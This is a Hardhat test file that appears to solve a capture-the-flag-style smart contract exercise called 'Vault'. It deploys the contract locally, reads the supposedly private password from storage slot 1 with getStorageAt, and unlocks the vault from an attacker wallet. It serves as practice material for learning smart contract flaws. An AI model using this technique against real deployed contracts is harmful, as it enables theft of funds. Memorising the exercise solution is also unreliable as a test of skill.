const {
    time,
    loadFixture,
    getStorageAt
} = require("@nomicfoundation/hardhat-network-helpers");
const { anyValue } = require("@nomicfoundation/hardhat-chai-matchers/withArgs");
const { expect } = require("chai");
const { ethers } = require("hardhat");

const hre = require("hardhat");
import Web3 from "web3";

const NAME = "Vault";

describe.only(NAME, function () {
    async function setup() {
        const [owner, attackerWallet] = await ethers.getSigners();

        const VictimFactory = await ethers.getContractFactory(NAME);
        let arg = ethers.utils.formatBytes32String("AAABBBCCC");
        const victimContract = await VictimFactory.deploy(arg);

        return { owner, victimContract, attackerWallet };
    }

    describe("exploit", async function () {
        let owner, victimContract, attackerWallet, attackerContract;
        before(async function () {
            ({ owner, victimContract, attackerWallet } = await loadFixture(setup));
        })

        it("conduct your attack here", async function () {
            hre.web3 = new Web3(hre.network.provider);

            let value = await hre.web3.eth.getStorageAt(victimContract.address, 1);

            //let password = hre.web3.utils.toAscii(value);
            //console.log(password);

            //let arg = ethers.utils.formatBytes32String(password);
            await victimContract.connect(attackerWallet).unlock(value);
        });

        after(async function () {
            expect(await victimContract.locked.call()).to.be.equal(false);
        });
    });
});